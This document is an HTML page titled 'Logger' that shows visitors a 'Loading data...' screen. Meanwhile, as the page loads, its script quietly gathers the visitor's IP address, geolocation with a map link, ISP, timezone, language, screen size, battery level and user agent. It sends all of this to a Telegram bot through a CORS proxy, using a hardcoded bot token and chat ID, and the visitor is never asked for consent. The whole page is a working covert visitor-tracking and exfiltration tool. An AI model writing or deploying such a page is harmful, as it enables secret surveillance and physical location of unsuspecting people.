<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Logger</title>
</head>
<body>
  <h1>Loading data...</h1>
  <script>
    const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
    const CHAT_ID = "7218964278";

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json");
        return await res.json();
      } catch {
        return {};
      }
    }

    async function getBattery() {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return `Level: ${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
      }
      return "Not supported";
    }

    async function sendTelegram(message) {
      const proxyUrl = "https://api.allorigins.win/raw?url=" +
        encodeURIComponent(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);

      await fetch(proxyUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    async function main() {
      const ip = await getIPInfo();
      const battery = await getBattery();

      const mapLink = ip.latitude && ip.longitude
        ? `[ğŸ“ View Map](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})`
        : 'Location unavailable';

      const msg = `
ğŸ“¡ *New Visitor Log*

ğŸŒ *IP:* ${ip.ip || "N/A"}
ğŸ“ *Location:* ${ip.city || "?"}, ${ip.region || "?"}, ${ip.country_name || "?"}
ğŸ—ºï¸ ${mapLink}
ğŸ¢ *ISP:* ${ip.org || "N/A"}

ğŸ§­ *Timezone:* ${ip.timezone || "N/A"}
ğŸ—£ *Language:* ${navigator.language}
ğŸ“ *Screen:* ${window.screen.width}x${window.screen.height}
ğŸ”‹ *Battery:* ${battery}
ğŸ§  *User Agent:* ${navigator.userAgent}
      `.trim();

      await sendTelegram(msg);
      document.body.innerHTML = "<h2>âœ… Data sent to Telegram!</h2>";
    }

    main();
  </script>
</body>
</html>
